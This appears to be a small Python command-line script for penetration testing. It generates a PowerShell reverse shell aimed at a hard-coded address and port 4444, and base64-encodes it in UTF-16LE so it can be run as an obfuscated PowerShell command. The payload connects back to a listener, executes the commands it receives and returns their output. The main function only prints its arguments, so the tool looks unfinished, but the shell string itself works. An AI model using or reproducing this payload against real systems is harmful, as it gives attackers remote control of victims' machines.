import typer
import base64
import re
from typing_extensions import Annotated

ip_address = '192.168.45.166'
port = '4444'

app = typer.Typer()

def generate_reverse_shell(ip_address, port):
    revshell_string = '$client = New-Object System.Net.Sockets.TCPClient("'+ ip_address + '",'+ port +');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    return revshell_string

def powershell_encode(data):
    blank_command = ""
    encoded_powershell = ""
    # Remove weird chars that could have been added by ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')

    for char in (n.sub("", data)):
        blank_command += char + "\x00"

    encoded_powershell = blank_command

    encoded_powershell = base64.b64encode(encoded_powershell.encode())
    return encoded_powershell.decode("utf-8")

def main(ipAddr: Annotated[str, typer.Argument()], port: Annotated[str, typer.Argument()]):
    if (ipAddr and port) is not None:
        print(ipAddr)
        print(port)


if __name__ == "__main__":
    typer.run(main)
